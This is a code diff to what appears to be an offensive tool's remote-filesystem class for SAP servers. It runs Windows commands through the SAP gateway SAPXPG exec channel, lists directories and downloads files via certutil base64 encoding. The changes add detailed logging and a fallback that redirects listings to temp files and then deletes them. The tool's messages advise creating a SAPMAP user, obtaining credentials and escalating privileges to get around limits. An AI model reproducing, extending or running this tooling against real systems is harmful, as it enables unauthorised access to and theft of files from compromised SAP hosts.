@@ -365,11 +365,13 @@ class TargetFS:
                      "elapsed": round(time.time() - t0, 2)}
 
         # Chunked base64 read
+        self._last_download_error = ""
         content = _download_fn(remote_path, size,
                                 progress_cb=progress_cb)
         if content is None:
-            return {"ok": False, "error":
-                     "chunked read failed — see console output"}
+            err = getattr(self, "_last_download_error", "") \
+                or "chunked read failed — see console output"
+            return {"ok": False, "error": err}
         if len(content) != size:
             return {"ok": False, "error":
                      f"size mismatch after reassembly: "
@@ -1233,14 +1235,34 @@ class TargetFS:
 
         _emit(0, "single_shot")
         tmp = self._win_tmp(".b64")
+        print(f"[*] {self.label}: download_windows({remote_path!r}, "
+              f"size={size} B) via certutil -encode → {tmp}")
         # Step 1: certutil -encode → temp file (no stdout needed)
         r = self._win_cmd(
             f'certutil -encode "{remote_path}" "{tmp}"')
-        out_lo = " ".join(r.get("output", [])).lower()
+        raw_out = " ".join(r.get("output", []))
+        out_lo = raw_out.lower()
+        print(f"[*] {self.label}:   certutil -encode returned "
+              f"success={r.get('success')} out={raw_out[:200]!r}")
+        # Access denied?  certutil prints "Access is denied." to stdout
+        # and exits non-zero.  Common when <sid>adm lacks NTFS read
+        # permission on files owned by other services (e.g. TMS_TEST
+        # files on P:\usr\sap\trans\tmp).
+        if "access is denied" in out_lo or "access denied" in out_lo:
+            self._win_cmd(f'del /q /f "{tmp}" 2>nul')
+            msg = (f"Access denied reading {remote_path} — the exec "
+                   f"channel's user (<sid>adm on GW SAPXPG) lacks NTFS "
+                   f"read permission.  Try SXPG-authenticated channel "
+                   f"or grant read to the SAP service account.")
+            self._last_download_error = msg
+            print(f"[-] {self.label}: {msg}")
+            return None
         if "failed" in out_lo or not r.get("success"):
             self._win_cmd(f'del /q /f "{tmp}" 2>nul')
-            print(f"[-] {self.label}: certutil -encode failed for "
-                  f"{remote_path} — {out_lo[:200]}")
+            msg = (f"certutil -encode failed for {remote_path}: "
+                   f"{raw_out[:200]}")
+            self._last_download_error = msg
+            print(f"[-] {self.label}: {msg}")
             return None
         # Step 2: type the temp file to read the b64 payload
         r = self._win_cmd(f'type "{tmp}"')
@@ -1249,18 +1271,21 @@ class TargetFS:
         self._win_cmd(f'del /q /f "{tmp}" 2>nul')
         decoded = _decode_certutil_b64(out_text)
         if decoded is None:
-            print(f"[-] {self.label}: certutil -encode returned no "
-                  f"parseable base64 payload for {remote_path} — raw "
-                  f"output: {out_text[:200]!r}")
+            msg = (f"certutil -encode succeeded but the base64 payload "
+                   f"was unreadable via `type` — raw: {out_text[:200]!r}")
+            self._last_download_error = msg
+            print(f"[-] {self.label}: {msg}")
             return None
         if len(decoded) != size:
-            print(f"[-] {self.label}: certutil -encode returned "
-                  f"{len(decoded)} B, expected {size} — SAPXPG "
-                  f"probably truncated stdout on this large file.  "
-                  f"Try SXPG (create credentials + escalate first) "
-                  f"or grab the file in smaller chunks.")
+            msg = (f"certutil -encode returned {len(decoded)} B, "
+                   f"expected {size} — SAPXPG probably truncated "
+                   f"stdout on this large file.  Try SXPG (create "
+                   f"credentials + escalate first) or a smaller file.")
+            self._last_download_error = msg
+            print(f"[-] {self.label}: {msg}")
             return None
         _emit(size, "single_shot")
+        print(f"[+] {self.label}:   downloaded {size} B via certutil")
         return decoded
 
     def enumerate_drives(self) -> dict:
@@ -1332,8 +1357,15 @@ class TargetFS:
                      }],
                      "error": ""}
 
+        print(f"[*] {self.label}: list_dir_windows({remote_path!r}) — "
+              f"trying `dir /-C /A`")
         r = self._win_cmd(f'dir /-C /A "{remote_path}"')
         lines = r.get("output", []) or []
+        print(f"[*] {self.label}:   dir /-C /A returned "
+              f"success={r.get('success')} lines={len(lines)}")
+        if lines and len(lines) <= 3:
+            print(f"[*] {self.label}:   raw output: "
+                  f"{[l[:100] for l in lines]!r}")
         if lines:
             first_lo = lines[0].lower()
             if "file not found" in first_lo \
@@ -1341,6 +1373,11 @@ class TargetFS:
                     or "cannot find" in first_lo:
                 return {"ok": False, "path": remote_path, "entries": [],
                          "error": lines[0].strip()}
+            if "access is denied" in first_lo \
+                    or "access denied" in first_lo:
+                return {"ok": False, "path": remote_path, "entries": [],
+                         "error": ("Access denied — <sid>adm lacks "
+                                    "read permission on this path")}
 
         entries = []
         seen = set()
@@ -1355,21 +1392,40 @@ class TargetFS:
             entries.append(entry)
 
         if entries:
+            print(f"[+] {self.label}:   parsed {len(entries)} entries "
+                  f"from dir /-C /A output")
             return {"ok": True, "path": remote_path,
                      "entries": entries, "error": ""}
 
         # Fallback: dir /B (bare names, one per line) — much less
         # stdout than dir /-C /A, survives GW SAPXPG buffer limits
         # on populous dirs.  Then batched stat for metadata.
+        print(f"[*] {self.label}:   dir /-C /A returned no parseable "
+              f"entries — trying `dir /B /A` fallback")
         entries = self._list_dir_via_names_windows(remote_path)
         if entries is not None:
             return {"ok": True, "path": remote_path,
                      "entries": entries, "error": ""}
 
+        # Last resort: redirect dir output to a temp file, then download
+        # the file via certutil.  Bypasses SAPXPG's stdout buffer entirely.
+        print(f"[*] {self.label}:   dir /B /A also empty — trying "
+              f"file-redirect fallback (dir > tmp + certutil download)")
+        entries = self._list_dir_via_file_redirect_windows(remote_path)
+        if entries is not None:
+            return {"ok": True, "path": remote_path,
+                     "entries": entries, "error": ""}
+
+        print(f"[-] {self.label}:   ALL Windows listing strategies "
+              f"failed for {remote_path} — SAPXPG channel is unusable "
+              f"for this path.  Create a SAPMAP user (SXPG channel) "
+              f"to bypass this limit.")
         return {"ok": False, "path": remote_path, "entries": [],
-                 "error": ("dir returned no output — SAPXPG may "
-                           "have dropped stdout, or the path "
-                           "doesn't exist")}
+                 "error": ("dir returned no output via GW SAPXPG — "
+                           "the exec channel dropped stdout even for "
+                           "bare-names + file-redirect fallbacks. "
+                           "Create a SAPMAP user for the SXPG channel "
+                           "to bypass this limit.")}
 
     def _list_dir_via_names_windows(self, remote_path: str
                                       ) -> Optional[list]:
@@ -1383,10 +1439,17 @@ class TargetFS:
         """
         r = self._win_cmd(f'dir /B /A "{remote_path}"')
         lines = r.get("output", []) or []
+        print(f"[*] {self.label}:   dir /B /A returned "
+              f"success={r.get('success')} lines={len(lines)}")
         if not lines:
             return None
         first_lo = lines[0].lower()
         if "file not found" in first_lo or "path not found" in first_lo:
+            print(f"[-] {self.label}:   dir /B /A: {lines[0].strip()}")
+            return None
+        if "access is denied" in first_lo or "access denied" in first_lo:
+            print(f"[-] {self.label}:   dir /B /A: access denied "
+                  f"— <sid>adm cannot read {remote_path}")
             return None
         names = []
         seen = set()
@@ -1421,6 +1484,60 @@ class TargetFS:
                 "mode":   "<DIR>" if st.get("is_dir") else "",
             })
         return entries
+
+    def _list_dir_via_file_redirect_windows(self, remote_path: str
+                                               ) -> Optional[list]:
+        """Last-resort fallback: redirect dir output to a temp file,
+        then read the file back via ``type``.
+
+        Bypasses SAPXPG's stdout buffer entirely — the dir output is
+        written to the target filesystem instead of flowing through
+        the exec channel's P3/P4 TLV frames.  The temp file is then
+        read back via ``type`` which works reliably for small files.
+
+        Flow:
+          1. ``dir /B /A "path" > tmpfile``  (no stdout — redirect)
+          2. ``type "tmpfile"``              (read names back)
+          3. ``del /q /f "tmpfile" 2>nul``   (cleanup)
+          4. Parse names → batched stat for metadata
+        """
+        tmp = self._win_tmp(".dir")
+        print(f"[*] {self.label}:   file-redirect: "
+              f'dir /B /A "{remote_path}" > "{tmp}"')
+        self._win_cmd(f'dir /B /A "{remote_path}" >"{tmp}"')
+
+        r = self._win_cmd(f'type "{tmp}"')
+        lines = r.get("output", []) or []
+        print(f"[*] {self.label}:   file-redirect: type returned "
+              f"{len(lines)} lines")
+        self._win_cmd(f'del /q /f "{tmp}" 2>nul')
+
+        if not lines:
+            print(f"[-] {self.label}:   file-redirect: type returned "
+                  f"empty — tmpfile was not written or is empty")
+            return None
+        first_lo = lines[0].lower()
+        if "file not found" in first_lo or "path not found" in first_lo:
+            print(f"[-] {self.label}:   file-redirect: {lines[0].strip()}")
+            return None
+
+        names = []
+        seen = set()
+        for ln in lines:
+            name = ln.strip()
+            if not name or name in (".", ".."):
+                continue
+            if name.lower() in seen:
+                continue
+            seen.add(name.lower())
+            names.append(name)
+        if not names:
+            print(f"[-] {self.label}:   file-redirect: no valid names "
+                  f"parsed from {len(lines)} lines")
+            return None
+        print(f"[*] {self.label}:   file-redirect: {len(names)} names → "
+              f"batched stat")
+        return self._batched_stat_windows(remote_path, names)
 
     def _stat_windows(self, remote_path: str) -> dict:
         """Get size / mtime / is_dir via ``dir /-C /A <path>``.
